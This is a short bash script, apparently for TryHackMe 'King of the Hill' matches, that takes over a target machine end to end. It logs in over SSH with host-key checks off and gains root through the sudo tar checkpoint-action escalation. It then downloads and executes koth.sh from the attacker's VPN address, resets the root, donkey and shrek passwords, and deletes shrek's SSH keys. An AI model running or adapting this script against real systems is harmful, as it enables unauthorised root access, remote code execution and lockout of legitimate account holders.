#!/bin/bash

read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no donkey@"$ip_address" << EOF

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    sleep 2

    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "$password" | passwd --stdin root
    echo "$password" | passwd --stdin donkey
    echo "$password" | passwd --stdin shrek
    rm -rf /home/shrek/.ssh
EOF
